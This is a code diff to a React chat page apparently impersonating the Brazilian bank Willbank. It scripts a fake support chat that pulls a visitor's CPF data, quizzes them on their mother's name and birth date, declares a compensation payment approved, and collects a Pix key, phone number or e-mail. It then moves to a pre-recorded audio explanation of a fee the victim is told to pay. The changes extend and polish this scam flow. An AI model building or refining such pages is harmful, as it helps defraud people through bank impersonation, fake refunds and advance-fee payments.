@@ -2,7 +2,7 @@ import { useEffect, useState, useRef } from "react";
 import { useNavigate, useLocation } from "react-router-dom";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
-import { CheckCircle2, Play, Pause, Check, ArrowLeft, MoreVertical, Phone, Send, Mic, Paperclip, Smile, Volume2, Shield, Clock } from "lucide-react";
+import { CheckCircle2, Play, Pause, Check, ArrowLeft, MoreVertical, Phone, Send, Mic, Paperclip, Smile, Volume2, Shield, Clock, Mail, Smartphone } from "lucide-react";
 import { CPFData } from "@/lib/cpf";
 import willbankLogo from "@/assets/willbank-logo.png";
 
@@ -15,11 +15,15 @@ type ChatStep =
   | "identity-confirmed"
   | "comprovante"
   | "pix-selection"
+  | "pix-type-selection"
   | "pix-confirm"
   | "generating-comprovante"
   | "comprovante-final"
+  | "envio-selection"
   | "sms-input"
+  | "email-input"
   | "taxa-explanation"
+  | "processing"
   | "final";
 
 interface QuizOption {
@@ -44,9 +48,13 @@ const Chat = () => {
   const [videoPlaying, setVideoPlaying] = useState(false);
   const [quizOptions, setQuizOptions] = useState<QuizOption[]>([]);
   const [phoneNumber, setPhoneNumber] = useState("");
+  const [emailInput, setEmailInput] = useState("");
+  const [showPhoneInput, setShowPhoneInput] = useState(false);
+  const [showEmailInput, setShowEmailInput] = useState(false);
   const [isTyping, setIsTyping] = useState(false);
   const [currentAudio, setCurrentAudio] = useState<HTMLAudioElement | null>(null);
   const [playingAudioId, setPlayingAudioId] = useState<number | null>(null);
+  const [selectedPixType, setSelectedPixType] = useState<"cpf" | "email" | null>(null);
   const messagesEndRef = useRef<HTMLDivElement>(null);
   const videoRef = useRef<HTMLVideoElement>(null);
 
@@ -230,6 +238,7 @@ const Chat = () => {
 
   const handleQuizAnswer = async (option: QuizOption, quizType: "mae" | "nascimento") => {
     addUserMessage(<span>{option.text}</span>);
+    setQuizOptions([]); // Clear options immediately after selection
     
     await delay(500);
     
@@ -263,6 +272,12 @@ const Chat = () => {
       }
     } else {
       await addBotMessage(<span className="text-red-500">❌ Resposta incorreta. Por favor, tente novamente.</span>, true, 40);
+      // Regenerate options for retry
+      if (quizType === "mae") {
+        setQuizOptions(generateFakeOptions(cpfData?.nomeMae || "", "mae"));
+      } else {
+        setQuizOptions(generateFakeOptions(cpfData?.dataNascimento || "", "nascimento"));
+      }
     }
   };
 
@@ -335,8 +350,8 @@ const Chat = () => {
 
     await delay(2000);
 
-    // Audio 1
-    await addAudioMessage("/audio/audio-1.mp3", "0:15");
+    // Audio 3 (was audio-1, now fixed to play first)
+    await addAudioMessage("/audio/audio-3.mp3", "0:15");
 
     await delay(1500);
 
@@ -345,6 +360,7 @@ const Chat = () => {
 
   const handleAprovarIndenizacao = async () => {
     addUserMessage(<span>✓ APROVAR INDENIZAÇÃO</span>);
+    setStep("processing"); // Clear button immediately
 
     await delay(1500);
 
@@ -363,7 +379,6 @@ const Chat = () => {
         </div>
 
         <div className="text-center space-y-2">
-          <p className="font-bold text-lg">{cpfData?.nome}</p>
           <p className="text-sm text-muted-foreground">Valor aprovado</p>
           <p className="text-3xl font-black text-green-600">R$ {valorBeneficio.toLocaleString('pt-BR', { minimumFractionDigits: 2 })}</p>
         </div>
@@ -383,13 +398,15 @@ const Chat = () => {
 
     await delay(1500);
 
-    await addBotMessage(<span>Selecione o tipo de <strong>Chave Pix</strong>:</span>, true, 35);
+    await addBotMessage(<span>Selecione o tipo de <strong>Chave Pix</strong> para receber:</span>, true, 45);
 
-    setStep("pix-confirm");
+    setStep("pix-type-selection");
   };
 
-  const handlePixType = async () => {
-    addUserMessage(<span>CPF</span>);
+  const handlePixTypeCPF = async () => {
+    addUserMessage(<span>📋 CPF</span>);
+    setSelectedPixType("cpf");
+    setStep("processing");
 
     await delay(2000);
 
@@ -399,17 +416,55 @@ const Chat = () => {
           <Shield className="w-5 h-5 text-amber-600" />
           Confirme sua Chave PIX
         </p>
-        <p className="font-mono bg-white px-4 py-3 rounded-lg border text-lg font-bold text-center">{cpfData?.cpf.replace(/\D/g, '')}</p>
+        <p className="font-mono bg-white px-4 py-3 rounded-lg border text-lg font-bold text-center">{cpfData?.cpf}</p>
         <p className="text-xs text-muted-foreground">Certifique-se que a chave está correta.</p>
       </div>,
       true, 60
     );
 
-    setStep("generating-comprovante");
+    setStep("pix-confirm");
+  };
+
+  const handlePixTypeEmail = async () => {
+    addUserMessage(<span>📧 E-mail</span>);
+    setSelectedPixType("email");
+    setStep("processing");
+
+    await delay(1500);
+
+    await addBotMessage(<span>Digite seu <strong>e-mail</strong> para cadastrar como chave PIX:</span>, true, 45);
+
+    setStep("email-input");
+    setShowEmailInput(true);
+  };
+
+  const handleEmailPixSubmit = async () => {
+    if (!emailInput.trim()) return;
+
+    addUserMessage(<span>{emailInput}</span>);
+    setShowEmailInput(false);
+    setStep("processing");
+
+    await delay(2000);
+
+    await addBotMessage(
+      <div className="bg-amber-50 border border-amber-300 rounded-xl p-4 space-y-3">
+        <p className="font-bold flex items-center gap-2">
+          <Shield className="w-5 h-5 text-amber-600" />
+          Confirme sua Chave PIX
+        </p>
+        <p className="font-mono bg-white px-4 py-3 rounded-lg border text-lg font-bold text-center">{emailInput}</p>
+        <p className="text-xs text-muted-foreground">Certifique-se que a chave está correta.</p>
+      </div>,
+      true, 60
+    );
+
+    setStep("pix-confirm");
   };
 
   const handleConfirmPix = async () => {
     addUserMessage(<span>Sim, está correto ✓</span>);
+    setStep("processing");
 
     await delay(1500);
 
@@ -427,7 +482,7 @@ const Chat = () => {
     
     await delay(2000);
 
-    // Audio 2
+    // Audio 2 (middle audio)
     await addAudioMessage("/audio/audio-2.mp3", "0:18");
 
     await delay(1500);
@@ -439,6 +494,7 @@ const Chat = () => {
 
   const handleGenerateComprovante = async () => {
     addUserMessage(<span>GERAR COMPROVANTE</span>);
+    setStep("processing");
 
     await delay(2000);
 
@@ -457,7 +513,7 @@ const Chat = () => {
         <div className="divide-y border rounded-xl overflow-hidden">
           <DataRow label="Valor" value={`R$ ${valorBeneficio.toLocaleString('pt-BR', { minimumFractionDigits: 2 })}`} highlight />
           <DataRow label="Protocolo" value={protocolo} />
-          <DataRow label="CPF" value={cpfData?.cpf.replace(/\D/g, '') || ""} />
+          <DataRow label="CPF" value={cpfData?.cpf || ""} />
           <DataRow label="Data/Hora" value={new Date().toLocaleString('pt-BR')} />
         </div>
       </div>,
@@ -468,32 +524,74 @@ const Chat = () => {
 
     await addBotMessage(<span>Como deseja receber o comprovante?</span>, true, 35);
 
-    setStep("sms-input");
+    setStep("envio-selection");
   };
 
   const handleSMSOption = async () => {
     addUserMessage(<span>📱 SMS</span>);
+    setStep("processing");
     
     await delay(1500);
     
     await addBotMessage(<span>Digite seu número de celular:</span>, true, 30);
+    
+    setStep("sms-input");
+    setShowPhoneInput(true);
+  };
+
+  const handleEmailOption = async () => {
+    addUserMessage(<span>📧 E-mail</span>);
+    setStep("processing");
+    
+    await delay(1500);
+    
+    await addBotMessage(<span>Digite seu e-mail:</span>, true, 20);
+    
+    setStep("email-input");
+    setShowEmailInput(true);
   };
 
   const handlePhoneSubmit = async () => {
     if (!phoneNumber.trim()) return;
 
     addUserMessage(<span>{phoneNumber}</span>);
+    setShowPhoneInput(false);
+    setStep("processing");
 
     await delay(2000);
 
     await addBotMessage(
       <span className="flex items-center gap-2 text-green-600">
         <CheckCircle2 className="w-4 h-4" />
-        Comprovante enviado!
+        Comprovante enviado para {phoneNumber}!
       </span>,
-      true, 20
+      true, 30
     );
 
+    await showTaxaExplanation();
+  };
+
+  const handleEnvioEmailSubmit = async () => {
+    if (!emailInput.trim()) return;
+
+    addUserMessage(<span>{emailInput}</span>);
+    setShowEmailInput(false);
+    setStep("processing");
+
+    await delay(2000);
+
+    await addBotMessage(
+      <span className="flex items-center gap-2 text-green-600">
+        <CheckCircle2 className="w-4 h-4" />
+        Comprovante enviado para {emailInput}!
+      </span>,
+      true, 30
+    );
+
+    await showTaxaExplanation();
+  };
+
+  const showTaxaExplanation = async () => {
     await delay(2500);
 
     await addBotMessage(
@@ -515,11 +613,12 @@ const Chat = () => {
 
   const handleTaxExplanation = async () => {
     addUserMessage(<span>❓ Por que tenho que pagar?</span>);
+    setStep("processing");
 
     await delay(2000);
 
-    // Audio 3 - Explanation
-    await addAudioMessage("/audio/audio-3.mp3", "0:25");
+    // Audio 1 - Explanation (was audio-3, now fixed to play last)
+    await addAudioMessage("/audio/audio-1.mp3", "0:25");
 
     await delay(1500);
     
@@ -700,7 +799,7 @@ const Chat = () => {
           {!showVideo && (
             <div className="flex flex-wrap gap-2 justify-center py-3">
               {/* Quiz Options */}
-              {(step === "quiz-mae" || step === "quiz-nascimento") && quizOptions.map((option, index) => (
+              {(step === "quiz-mae" || step === "quiz-nascimento") && quizOptions.length > 0 && quizOptions.map((option, index) => (
                 <Button
                   key={index}
                   onClick={() => handleQuizAnswer(option, step === "quiz-mae" ? "mae" : "nascimento")}
@@ -716,13 +815,18 @@ const Chat = () => {
                 </Button>
               )}
 
-              {step === "pix-confirm" && (
-                <Button onClick={handlePixType} className="bg-gradient-to-r from-primary to-amber-400 text-primary-foreground rounded-full font-bold shadow-lg px-8">
-                  CPF
-                </Button>
+              {step === "pix-type-selection" && (
+                <div className="flex flex-col gap-2 w-full max-w-xs">
+                  <Button onClick={handlePixTypeCPF} className="bg-gradient-to-r from-primary to-amber-400 text-primary-foreground rounded-full font-bold shadow-lg px-8">
+                    📋 CPF
+                  </Button>
+                  <Button onClick={handlePixTypeEmail} variant="outline" className="bg-slate-700 hover:bg-slate-600 text-white border-slate-600 rounded-full font-bold shadow-lg px-8">
+                    📧 E-mail
+                  </Button>
+                </div>
               )}
 
-              {step === "generating-comprovante" && (
+              {step === "pix-confirm" && (
                 <Button onClick={handleConfirmPix} className="bg-gradient-to-r from-green-500 to-emerald-500 text-white rounded-full font-bold shadow-lg px-8">
                   ✓ Sim, está correto
                 </Button>
@@ -734,10 +838,17 @@ const Chat = () => {
                 </Button>
               )}
 
-              {step === "sms-input" && !phoneNumber && (
-                <Button onClick={handleSMSOption} className="bg-slate-700 hover:bg-slate-600 text-white border border-slate-600 rounded-full font-medium shadow-lg">
-                  📱 Receber por SMS
-                </Button>
+              {step === "envio-selection" && (
+                <div className="flex flex-col gap-2 w-full max-w-xs">
+                  <Button onClick={handleSMSOption} className="bg-gradient-to-r from-primary to-amber-400 text-primary-foreground rounded-full font-bold shadow-lg px-8 flex items-center gap-2">
+                    <Smartphone className="w-4 h-4" />
+                    📱 Receber por SMS
+                  </Button>
+                  <Button onClick={handleEmailOption} variant="outline" className="bg-slate-700 hover:bg-slate-600 text-white border-slate-600 rounded-full font-bold shadow-lg px-8 flex items-center gap-2">
+                    <Mail className="w-4 h-4" />
+                    📧 Receber por E-mail
+                  </Button>
+                </div>
               )}
 
               {step === "taxa-explanation" && (
@@ -765,7 +876,7 @@ const Chat = () => {
             <Smile className="w-6 h-6" />
           </button>
           
-          {step === "sms-input" && phoneNumber !== undefined ? (
+          {showPhoneInput ? (
             <div className="flex-1 flex gap-2">
               <Input
                 placeholder="(00) 00000-0000"
@@ -775,6 +886,25 @@ const Chat = () => {
               />
               {phoneNumber && (
                 <Button onClick={handlePhoneSubmit} size="icon" className="rounded-full bg-primary hover:bg-primary/90 w-10 h-10">
+                  <Send className="w-5 h-5" />
+                </Button>
+              )}
+            </div>
+          ) : showEmailInput ? (
+            <div className="flex-1 flex gap-2">
+              <Input
+                placeholder="seuemail@exemplo.com"
+                type="email"
+                value={emailInput}
+                onChange={(e) => setEmailInput(e.target.value)}
+                className="flex-1 bg-slate-700 border-slate-600 text-white placeholder:text-slate-400 rounded-full"
+              />
+              {emailInput && (
+                <Button 
+                  onClick={selectedPixType === "email" ? handleEmailPixSubmit : handleEnvioEmailSubmit} 
+                  size="icon" 
+                  className="rounded-full bg-primary hover:bg-primary/90 w-10 h-10"
+                >
                   <Send className="w-5 h-5" />
                 </Button>
               )}
